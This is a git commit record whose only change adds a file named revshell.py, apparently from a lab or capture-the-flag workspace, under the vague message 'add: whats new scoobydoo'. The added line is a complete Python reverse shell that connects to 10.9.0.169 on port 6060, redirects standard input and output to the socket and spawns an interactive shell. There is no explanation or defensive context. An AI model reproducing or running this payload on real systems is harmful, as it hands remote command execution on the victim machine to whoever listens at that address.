b32bad56aab815527dd95432145416d1c27174ad
Tomba-Hopkins <saputrazamharimirza@gmail.com>
2025-01-21 10:16:55 +0700

    add: whats new scoobydoo

---
+++ valley/revshell.py
@@ -0,0 +1,1 @@
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.169",6060));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
